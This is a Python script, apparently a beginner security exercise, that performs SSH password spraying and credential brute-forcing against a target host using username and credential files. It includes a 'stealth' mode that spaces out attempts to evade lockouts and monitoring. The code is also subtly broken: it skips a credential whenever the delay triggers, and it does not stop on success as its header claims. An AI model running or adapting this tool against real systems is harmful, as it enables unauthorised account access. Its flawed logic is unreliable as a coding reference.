# Beginner Task: Write a script that will perform a password spray
# against the SSH service using a single username and password list.
# It should output each time a username/password combination is failed,
# and stop on a successful log in.

import argparse
import getpass
import paramiko
import sys
import time

class bcolors:
    OK = '\033[92m'  # GREEN
    WARNING = '\033[93m'  # YELLOW
    FAIL = '\033[91m'  # RED
    RESET = '\033[0m'  # RESET COLOR

def ssh_login(ip, port, user, passwd):

    client = paramiko.SSHClient()
    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    print(f"{ip}:{port} using [{user}:{passwd}]", end='')
    try:
        client.connect(ip, port=port, username=user, password=passwd)
        return True
    except Exception as e:
        print(f"{bcolors.FAIL} Connection failed:{bcolors.RESET} {e}")
        return False



if __name__ == '__main__':


    parser = argparse.ArgumentParser(
        description='Search for a provided list of queries.')
    parser.add_argument('-t', '--target', default='127.0.0.1',
                        help='Target hostname or IP')
    parser.add_argument('-p', '--port', default='22', help='SSH port')
    parser.add_argument('--credfile', default='default_creds.txt',
                        help='Load comma-separated credentials from file for brute force')
    parser.add_argument('--brute', default=False, action='store_true',
                        help='Brute force attack using comma-separated file of usernames and passwords')
    parser.add_argument('--userfile', default='default_users.txt',
                        help='Load usernames from file for password spray')
    parser.add_argument('--spray', default=False, action='store_true',
                        help='Perform password spray using provided file containing usernames and a specified password')
    parser.add_argument('--password', default='password', help='Password to use with --spray')
    parser.add_argument('--stealth', default=False, action='store_true', help='Perform a number of logins, then delay a specified time')
    parser.add_argument('--attempts', default=5, type=int, help='Number of attempts before delay.')
    parser.add_argument('--delay', default=60, type=int, help='Time to delay between attempts (in seconds)')


    args = parser.parse_args()

    ip = args.target
    port = args.port
    delay = args.delay
    stealth = args.stealth
    attempted = 0

    # brute force
    if args.brute:
        with open(args.credfile, "r") as creds_file:
            credentials = creds_file.readlines()
            for credential in credentials:
                user, password = credential.split(",")
                if attempted >= args.attempts:
                    time.sleep(delay)
                    attempted = 0
                else:
                    if stealth == True:
                        attempted += 1
                    if ssh_login(ip, port, user, password.rstrip()):
                        print(f"{bcolors.OK}SUCCESS{bcolors.RESET}")

    # credential spray
    if args.spray:
        with open(args.userfile) as userfile:
            users = userfile.readlines()
            for user in users:
                if attempted >= args.attempts:
                    time.sleep(delay)
                    attempted = 0
                else:
                    if stealth == True:
                        attempted += 1
                    if ssh_login(ip, port, user.rstrip(), args.password):
                        print(f"{bcolors.OK} SUCCESS{bcolors.RESET}")
                    

